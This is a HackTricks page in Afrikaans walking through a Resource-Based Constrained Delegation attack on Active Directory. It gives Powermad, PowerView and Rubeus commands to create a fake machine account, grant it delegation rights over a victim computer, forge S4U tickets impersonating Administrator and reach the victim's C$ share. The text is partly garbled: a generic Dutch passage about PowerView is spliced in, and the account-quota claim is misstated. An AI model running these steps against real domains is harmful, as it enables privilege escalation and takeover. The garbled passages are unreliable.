# Bron-gebaseerde Beperkte Delegasie

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese beginsels van Bron-gebaseerde Beperkte Delegasie

Dit is soortgelyk aan die basiese [Beperkte Delegasie](constrained-delegation.md) maar **in plaas daarvan** om toestemmings aan 'n **voorwerp** te gee om **enige gebruiker teenoor 'n diens te verteenwoordig**. Bron-gebaseerde Beperkte Delegasie **stel in** die voorwerp wie in staat is om enige ander gebruiker teenoor hom te verteenwoordig.

In hierdie geval sal die beperkte voorwerp 'n eienskap hê genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ met die naam van die gebruiker wat enige ander gebruiker teenoor hom kan verteenwoordig.

'n Ander belangrike verskil tussen hierdie Beperkte Delegasie en die ander delegasies is dat enige gebruiker met **skryfregte oor 'n rekenaarrekening** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) die _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan instel (In die ander vorme van Delegasie het jy domein-admin-privileges nodig).

### Nuwe Konsepte

In Beperkte Delegasie is daar gesê dat die **`TrustedToAuthForDelegation`**-vlag binne die _userAccountControl_-waarde van die gebruiker nodig is om 'n **S4U2Self** uit te voer. Maar dit is nie heeltemal waar nie.\
Die werklikheid is dat selfs sonder daardie waarde kan jy 'n **S4U2Self** uitvoer teenoor enige gebruiker as jy 'n **diens** is (het 'n SPN), maar as jy **`TrustedToAuthForDelegation`** het, sal die teruggekeerde TGS **Forwardable** wees en as jy nie daardie vlag het nie, sal die teruggekeerde TGS **nie** Forwardable wees nie.

Maar as die **TGS** wat in **S4U2Proxy** gebruik word **nie Forwardable** is nie en jy probeer 'n **basiese Beperkte Delegasie** misbruik, sal dit **nie werk nie**. Maar as jy probeer om 'n **Bron-gebaseerde beperkte delegasie uit te buit, sal dit werk** (dit is nie 'n kwesbaarheid nie, dit is blykbaar 'n funksie).

### Aanvalstruktuur

> As jy **skrywekwivalente regte** het oor 'n **Rekenaar**-rekening, kan jy **bevoorregte toegang** tot daardie masjien verkry.

Veronderstel dat die aanvaller reeds **skrywekwivalente regte** het oor die slagofferrekenaar.

1. Die aanvaller **kompromitteer** 'n rekening wat 'n **SPN** het of **skep een** ("Diens A"). Let daarop dat **enige** _Admin-gebruiker_ sonder enige ander spesiale voorreg 'n maksimum van 10 **Rekenaarvoorwerpe (**_**MachineAccountQuota**_**)** kan **skep** en hulle 'n SPN kan instel. Die aanvaller kan dus net 'n Rekenaarvoorwerp skep en 'n SPN instel.
2. Die aanvaller **misbruik sy SKRYF-reg** oor die slagofferrekenaar (Diens B) om **bron-gebaseerde beperkte delegasie te konfigureer om Diens A toe te laat om enige gebruiker te verteenwoordig** teenoor daardie slagofferrekenaar (Diens B).
3. Die aanvaller gebruik Rubeus om 'n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) uit te voer van Diens A na Diens B vir 'n gebruiker **met bevoorregte toegang tot Diens B**.
1. S4U2Self (vanaf die gekompromitteerde/gemaakte rekening met die SPN): Vra vir 'n **TGS van die Administrateur aan my** (Nie Forwardable nie).
2. S4U2Proxy: Gebruik die **nie Forwardable TGS** van die vorige stap om 'n **TGS** van die **Administrateur** na die **slagoffer-gashuis** te vra.
3. Selfs al gebruik jy 'n nie Forwardable TGS nie, sal dit werk omdat jy bron-gebaseerde beperkte delegasie uitbuit.
4. Die aanvaller kan die kaartjie deurgee en die gebruiker **verteenwoordig** om **toegang tot die slagoffer Diens B** te verkry.

Om die _**MachineAccountQuota**_ van die domein te kontroleer, kan jy die volgende gebruik:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep 'n Rekenaarvoorwerp

Jy kan 'n rekenaarvoorwerp binne die domein skep deur [powermad](https://github.com/Kevin-Robertson/Powermad)**:** te gebruik.
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurering van Hulpbron-gebaseerde Beperkte Delegasie

**Met behulp van de activedirectory PowerShell-module**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Met behulp van powerview**

Powerview is een krachtige tool die wordt gebruikt voor het uitvoeren van verschillende Active Directory-taken vanaf een Windows-systeem. Het biedt verschillende functies en cmdlets die kunnen worden gebruikt om informatie te verzamelen en verschillende acties uit te voeren in een Active Directory-omgeving.

Hier zijn enkele veelgebruikte Powerview-functies:

- **Get-DomainUser**: Hiermee kunt u informatie verzamelen over gebruikersaccounts in het domein, zoals gebruikersnaam, SID, groepslidmaatschap en meer.

- **Get-DomainGroup**: Hiermee kunt u informatie verzamelen over groepen in het domein, zoals groepsnaam, SID, leden en meer.

- **Get-DomainComputer**: Hiermee kunt u informatie verzamelen over computers in het domein, zoals computernaam, SID, besturingssysteem en meer.

- **Get-DomainGroupMember**: Hiermee kunt u de leden van een specifieke groep in het domein ophalen.

- **Get-DomainObjectAcl**: Hiermee kunt u de toegangscontrollijst (ACL) van een specifiek object in het domein ophalen.

- **Get-DomainObject**: Hiermee kunt u informatie verzamelen over een specifiek object in het domein, zoals gebruikers, groepen, computers en meer.

- **Get-DomainTrust**: Hiermee kunt u informatie verzamelen over vertrouwensrelaties tussen domeinen.

- **Get-DomainPolicy**: Hiermee kunt u informatie verzamelen over het groepsbeleid in het domein.

Powerview biedt ook verschillende cmdlets voor het uitvoeren van acties zoals het maken van nieuwe gebruikers, groepen en computers, het wijzigen van gebruikerswachtwoorden, het toevoegen van gebruikers aan groepen en meer.

Het is belangrijk op te merken dat Powerview alleen kan worden gebruikt als u al toegang heeft tot een Windows-systeem binnen het domein en de juiste rechten heeft. Het is een krachtige tool, maar moet met de nodige voorzichtigheid worden gebruikt om onbedoelde schade te voorkomen.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Die uitvoering van 'n volledige S4U-aanval

Eerstens het ons die nuwe Rekenaarobjek geskep met die wagwoord `123456`, so ons benodig die has van daardie wagwoord:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hierdie sal die RC4 en AES hasings vir daardie rekening druk.\
Nou kan die aanval uitgevoer word:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Jy kan meer kaartjies genereer deur net een keer te vra deur die gebruik van die `/altservice` parameter van Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Let daarop dat gebruikers 'n eienskap het wat "**Kan nie gedelegeer word nie**" genoem word. As 'n gebruiker hierdie eienskap op Waar het, sal jy hom nie kan voorstel nie. Hierdie eienskap kan binne bloodhound gesien word.
{% endhint %}

### Toegang verkry

Die laaste opdraglyn sal die **volledige S4U-aanval uitvoer en die TGS in die geheue van die slagofferbediener inspuit**.\
In hierdie voorbeeld is 'n TGS vir die **CIFS**-diens van die Administrator aangevra, sodat jy toegang kan verkry tot **C$**:
```bash
ls \\victim.domain.local\C$
```
### Misbruik verskillende dienskaartjies

Leer oor die [**beskikbare dienskaartjies hier**](silver-ticket.md#beskikbare-dienste).

## Kerberos Foute

* **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos gekonfigureer is om nie DES of RC4 te gebruik nie en jy verskaf net die RC4-hash. Verskaf ten minste die AES256-hash aan Rubeus (of verskaf net die RC4-, AES128- en AES256-hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd van die huidige rekenaar verskil van dié van die DC en dat Kerberos nie behoorlik werk nie.
* **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashe nie werk om in te teken nie. Jy het dalk vergeet om die "$" binne die gebruikersnaam te plaas toe jy die hashe genereer (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Dit kan beteken:
* Die gebruiker wat jy probeer voorstel, kan nie toegang verkry tot die gewenste diens nie (omdat jy dit nie kan voorstel nie of omdat dit nie genoeg bevoegdhede het nie)
* Die gevraagde diens bestaan nie (as jy vra vir 'n kaartjie vir winrm, maar winrm is nie besig nie)
* Die geskepte fakecomputer het sy bevoegdhede oor die kwesbare bediener verloor en jy moet dit teruggee.

## Verwysings

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
